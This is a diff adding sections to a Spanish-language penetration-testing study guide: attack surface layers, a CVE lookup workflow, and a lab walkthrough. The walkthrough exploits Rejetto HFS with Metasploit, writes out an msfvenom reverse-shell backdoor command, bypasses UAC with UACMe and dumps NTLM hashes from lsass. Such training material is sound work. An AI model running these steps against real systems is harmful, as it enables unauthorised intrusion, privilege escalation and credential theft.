@@ -50,6 +50,15 @@
 
 <p align="center">
 
+  <img src="https://i.postimg.cc/ZRqj2Kd3/372.png" alt="Descripción de la imagen">
+
+</p>
+
+
+</br>
+
+<p align="center">
+
   <img src="https://i.postimg.cc/x8pDHjgX/opc-1.png" alt="Descripción de la imagen">
 
 </p>
@@ -4089,7 +4098,7 @@ En Nmap, la dirección IP 192.168.1.0 se designa como host zombie, mientras que 
 <p> 5. Creación de servidores simples: &nbsp; &nbsp; Servidor de chat, servidor HTTP básico, etc.</p>
 
 
-<p> Netcat sirve para capturar banner-grabbing, los banners revelan con frecuencia el nombre del software y la versión que se ejecuta en ese puerto</p>
+<p><b> Nota importante: Netcat sirve para capturar banner-grabbing, los banners revelan con frecuencia el nombre del software y la versión que se ejecuta en ese puerto</b></p>
 
 
 
@@ -6454,6 +6463,94 @@ En las operaciones de seguridad del mundo real, las bases de datos de vulnerabil
 
 
 
+<h2> :arrow_right: Superficie de ataque </h2> 
+
+
+<p>La superficie de ataque de un sistema es el conjunto total de puntos donde un atacante puede intentar interactuar con él. </p>
+
+
+<p><b>1. Capa de red</b></p>
+
+
+<p> • Puertos abiertos: 22, 80, 443, 445</p>
+<p> • Servicios corriendo: SSH, HTTP, SMB</p>
+<p> • Protocolos en uso: FTP, Telnet,SNMP </p>
+
+
+
+<p><b>2. Capa del sistema operativo</b></p>
+
+
+<p> • Cuentas de usuario: Usuarios locales y de dominio</p>
+<p> • Permisos de archivos: SUID, Rutas de escritura</p>
+<p> • Tareas programadas: Trabajos con servicios  </p>
+
+
+<p><b>3. Capa del Aplicacion</b></p>
+
+
+<p> • Parametros de URL: Cadenas de consulta, segmentos de ruta</p>
+<p> • Campos de formulario: Formularios de inicio de sesion, campos de busqueda</p>
+<p> • Encabezados HTTP: Cookies, referente, agente de usuario  </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/0ybwTMtn/373.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p>Un solo objetivo puede presentar una superficie de ataque en las tres capas simultáneamente</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 <p><b>  Evaluacioon de vulnerabilidades </b></p>
 
@@ -6496,10 +6593,28 @@ En las operaciones de seguridad del mundo real, las bases de datos de vulnerabil
 
 
 
+<h2> :pushpin: Flujo de trabajo típico después de la enumeración: <h2>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/zGh89qrY/374.png" alt="Descripción de la imagen">
+  
+</p>
 
 
 
+<p>1. Tome el primer servicio y versión de su inventario.</p>
 
+<p>2. Busque en NVD o Exploit-DB el nombre y la versión de ese software.</p>
+
+<p>3. Consulte GitHub para conocer el identificador CVE para encontrar cualquier código o herramienta de prueba de concepto.</p>
+
+<p>4. Revise los resultados, anotando cualquier CVE que afecte la versión exacta o un rango que la incluya.</p>
+
+<p>5. Evalúe la relevancia y explotabilidad de cada resultado.</p>
+
+<p>6. Repita esto para cada servicio del inventario.</p>
 
 
 
@@ -6548,6 +6663,7 @@ En las operaciones de seguridad del mundo real, las bases de datos de vulnerabil
 <p>1. Un atacante envía encabezados HTTP especialmente elaborados o variables de entorno</p>
 <p>2. La sintaxis () en variables de entorno se interpreta incorrectamente como definiciones de funciones</p>
 <p>3. El código malicioso se ejecuta antes de que comience la ejecución normal del programa</p>
+
 
 
 
@@ -8125,6 +8241,7 @@ de enlace de cuatro vías WPA entre un cliente y un dispositivo de infraestructu
 <p align="center">
 
   <img src="https://i.postimg.cc/DZhK6SGF/1.png" alt="Descripción de la imagen">
+
 </p>
 
 <p><b>&nbsp;&nbsp;&nbsp; • Paso 1. </b> Un atacante monitorea la red Wi-Fi y encuentra clientes inalámbricos conectados al SSID de la red corporativa. </p>
@@ -8223,19 +8340,242 @@ de enlace de cuatro vías WPA entre un cliente y un dispositivo de infraestructu
 
 
 
+<!-------------------------------------------------- Completar el modulo con un sistema vulnerable --------------------------------------------------------------------------->
 
 
 
 
 
 
+<!-------------------------------------------------- Bypassing UAC With UACMe --------------------------------------------------------------------------->
+
+
+<h2> :no_entry: Explotaciones del kernel de Windows / Eludir el UAC con UACMe </h2>
+
+
+<p><b> UAC (User Account Control)</b> es una característica de seguridad de Microsoft Windows que solicita permiso al usuario antes de realizar cambios que requieran privilegios de administrador. Cuando un proceso intenta realizar una tarea sensible, Windows lanza un prompt (la ventana de confirmación) para evitar que software malicioso tome control total del sistema sin intervención.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/tR5GC3H6/362.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p><b> Bypassing UAC (evasión de UAC)</b> es una técnica utilizada para elevar privilegios de un usuario estándar (o un administrador con nivel de token de usuario medio) a un nivel de administrador completo, sin que aparezca el prompt de confirmación (el molesto cuadro de diálogo de "Sí/No").</p>
+
+
+<p> <b>UACMe</b> es una herramienta de automatización (un framework) diseñada para realizar este bypass de manera eficiente. En lugar de probar métodos manualmente, UACMe contiene una colección de diversos métodos probados para evadir el control de cuentas de usuario</p>
+
+
+
+<p> :radio_button: Pasos</p>
+
+
+<p> 1. Identificar una vulnerabilidad que se ejecute en el objetivo la cual se pueda explotar para obtener acceso inicial </p>
+
+<p> Verifique los puertos abiertos en la máquina de destino: </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/25QTCxBC/363.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Hemos descubierto que hay varios puertos abiertos. Ejecutaremos Nmap nuevamente para determinar la información de la versión en el puerto 80.</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/wvzfNrd5/364.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> En la informacion del servidor se logra identificar que corresponde httpFileServer 2.3</p>
+
+
+<p> Esta version es vulnerable a RCE </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/PqC8dWVS/365.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> 2. Explotación del servidor de destino utilizando el marco Metasploit. </p>
+
+<p> Buscar el modulo Rejetto el cual corresponde al servidor HTTP </p>
+
+<p> Usar el modulo de explotacion <b>windows/http/rejetto_hfs_exec</b>  Rejetto HttpFileServer (HFS) es vulnerable a un ataque de ejecución remota de comandos debido a una expresión regular incorrecta en el archivo ParserLib.pas. Este módulo aprovecha los comandos de scripting de HFS utilizando «%00» para eludir el filtrado. Este módulo se ha probado con éxito en HFS 2.3b en Windows XP SP3, Windows 7 SP1 y Windows 8.</p>
+
+
+<p> Configurar los parametros necesarios y ejecutar el exploit </p>
+
+<p> Hemos explotado con éxito la aplicación vulnerable de destino (hfs) y hemos recibido un shell meterpreter. </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/5jc69TGq/366.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> La sesion actual de Meterpreter es de 32 bits, asi que se puede migrar el proceso buscando el identicador del proceso con <b>pgrep + explorer </b> </p>
+
+<p> Una vez se tenga identificado el proceso junto a su PIDs con el parametro <b>migrate + PIDs </b> esto proporcionara una sesion de Meterpreter de 64 bits </p>
+
+
+<p> <b> Nota la migración de una sesión de Meterpreter de 32 bits a 64 bits tras un bypass de UAC no es un paso opcional, sino un requisito crítico para la viabilidad de la operación.
+
+Mientras que la sesión de 32 bits te proporciona el acceso inicial necesario para establecer la comunicación, su capacidad de maniobra es extremadamente limitada debido a la incompatibilidad arquitectónica con los procesos principales del sistema operativo. La migración es el puente que transforma un acceso restringido en una capacidad de post-explotación</b>  </p>
+
+
+<p> Con el parametro <b>getuid</b> identificamos el usuario admin el cual debe ser parte del grupo de administradores locales </p>
 
 
 
 
+<p> 3. Verificar que el usuario hace parte del grupo de administradores locales con el parametro <b>shell</b></p>
+
+
+<p> Con el parametro <b>net user </b> podemos identificar los usuarios del sistema </p>
+
+<p> Con el parametro <b>net localgroup adminitrators </b> podemos identificar que usuario admin es miembro del grupo Administradores. Sin embargo, por ahora no tenemos ese alto privilegio. Podemos obtener altos privilegios al eludir el UAC (control de cuenta de usuario)</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/R0Gd3Lvh/367.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p>4.Omitir el UAC para el usuario administrador con la ayuda de la herramienta UACMe consultar el repositorio "https://github.com/hfiref0x/UACME" </p>
 
 
 
+<p align="center">
+
+  <img src="https://i.postimg.cc/7ZwQf6SS/368.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p>5. Generar una carga util usando MSFvenom y ejecutarlo en la máquina de destino para obtener privilegios de usuario admin<b>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.39.2 LPORT=1234 -f exe > puerta_trasera.exe</b></p>
+
+
+<p>Generar ejecutable malicioso <b>puerta_trasera.exe</b></p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/RZbSRjSy/369.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p>6. Establecer el oyente con msfconsole</p>
+
+
+<p>Usar multi/handler</p>
+
+
+<p> El modulo de explotacion (exploit/multi/handler) es un módulo de Metasploit que funciona como listener:su única función es esperar y capturar conexiones entrantes de payloads que se hayan ejecutado fuera del marco de trabajo. </p>
+
+
+<p> Cargar el payload de MSFvenom y parametros adicionales</p>
+
+<p> Confirmar aue el TCP inverso se encuentra escuchando en el puerto seleccionado </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/MZPzxCR5/370.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p>7. Regresar a la sesion de Meterpreter y crear un directorio Temp "El directorio temporal es practicamente la mejor ubicacion para transferir codigo de explotacion o ejecutables"</p>
+
+<p>Cargar la puerta trasera</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/sXJ7vjyf/371.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p>8. Cargar <b>Akagi64.exe</b> "jecutable de 64 bits de UACMe, una herramienta de código abierto diseñada para eludir el Control de Cuentas de Usuario (UAC) de Microsoft Windows.  Desarrollada por Hazardous Environments (y posteriormente asociada a nombres como REvol Corp o APT 92 en sus metadatos), esta utilidad permite la escalada de privilegios al ejecutar programas con permisos de administrador sin requerir una contraseña o autorización explícita."el cual se descargo del repositorio de Githun </p>
+
+<p>Cargar Akagi64.exe</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/6QdxdbMn/375.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p>Al mirar el contenido del directorio observamos que tenemos Akagi64.exe y la puerta_trasera.exe si quisieramos ejecutar la puerta trasera no es posible con los privilegio que tiene el usuario en el momento </p>
+
+
+<p>9. Eludir UAC usar el metodo o la clave 23 la cual se aprovecha del paquete de administrado en windows  </p>
+
+<p>Cargar nuevamenta el paquete Akagi y especificar la ruta de la puerta trasera, en el momento de presionar la tecla enter el oyente recibira una nueva sesion de meterpreter  </p>
+
+<p> Hemos obtenido con éxito acceso con altos privilegios. </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/DzVK43PV/376.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> 10. Volcar los hashes del usuario. </p>
+
+<p> proceso lsass.exe. </p>
+
+<p> lsass.exe significa Local Security Authority Subsystem Service. Es un proceso crítico del sistema operativo Microsoft Windows que se encarga de gestionar la seguridad de la máquina. Se ejecuta en la raíz de la memoria de usuario, pero bajo el contexto de la cuenta SYSTEM. </p>
+
+
+<p> Para un atacante, lsass.exe es una "mina de oro". Porque este proceso mantiene en memoria (RAM) información sensible para facilitar el "Single Sign-On" (inicio de sesión único), como: </p>
+
+
+<p><b>• Hashes de contraseñas (NTLM).</b></p>
+<p><b>• Tickets de Kerberos.</b></p>
+<p><b>• Credenciales en texto plano (si se utilizan protocolos antiguos o configuraciones específicas como WDigest).</b></p>
+
+<p>Con el parametro<b>ps</b>es posible listar todos los proceso o uno en especifico en este caso vamos a migrar el proceso lsass.exe.</p>
+
+
+<p> Proceder a Dump the hashes" (volcar los hashes) proceso de extraer una lista de contraseñas convertidas en hashes desde la memoria de un sistema o desde bases de datos de seguridad. </p>
+
+<p> Usar el parametro <b>hashdump</b> para extraer los hashes NTLM de las cuentas locales </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/8ckGkdBP/377.png" alt="Descripción de la imagen">
+  
+</p>
 
 
 
